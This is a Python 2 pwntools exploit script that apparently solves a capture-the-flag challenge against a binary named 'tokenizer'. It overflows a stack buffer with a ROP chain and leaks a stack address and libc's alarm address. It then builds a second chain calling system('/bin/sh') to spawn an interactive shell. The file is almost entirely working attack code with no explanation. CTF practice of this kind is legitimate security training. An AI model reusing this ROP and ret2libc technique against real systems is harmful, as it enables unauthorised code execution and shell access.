#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''

    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './tokenizer'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *0x401388
    b *0x000000000040149b
    b *0x0000000000401499
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

# 0x000000000040149b : pop rdi ; ret
pop_rdi_ret = 0x000000000040149b
# 0x0000000000401499 : pop rsi ; pop r15 ; ret
pop_rsi_r15_ret = 0x0000000000401499

layout = [
    pop_rdi_ret,
    0x404020,
    pop_rsi_r15_ret,
    elf.got['alarm'],
    0x404020,
    0x401080, #

    0x40133c, # main
]

length = len(flat(layout))
log.info('length: ' + str(length))
payload = p64(0x0000000000401016) * int((0x3f8 - length) / 8) + flat(layout) + 'b' * 8
# sh.sendline('a' * 0x3f8 + 'b' * 8)
sh.sendline(payload.replace('\0', '\xe0'))

# pause()
sh.recvuntil('b' * 8)
result = sh.recvline()[:-1]
stack_addr = u64(result.ljust(8, '\0'))
log.success('stack_addr: ' + hex(stack_addr))

if(p64(stack_addr)[0] == '\x20'):
    raise Exception() 

# pause()
sh.sendline(p64(stack_addr)[0])


sh.recvuntil('b' * 8 + '\n')
sh.recvline()
result = sh.recvuntil('W')[:-1]
print hexdump(result)
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['alarm']
log.success('libc_addr: ' + hex(libc_addr))

layout = [
    pop_rdi_ret,
    libc_addr + libc.search('/bin/sh\0').next(),
    libc_addr + libc.symbols['system'],
]
length = len(flat(layout))
payload = p64(0x0000000000401016) * int((0x3f8 - length) / 8) + flat(layout) + 'c' * 8

# sh.sendline('a' * 0x3f8 + 'b' * 8)
sh.sendline(payload.replace('\0', chr(0xe0 - 0x30)))

sh.sendline(chr(0xe0 - 0x30))

sh.recvuntil('c' * 8)
sh.recvuntil('c' * 8)

sh.interactive()
clear()
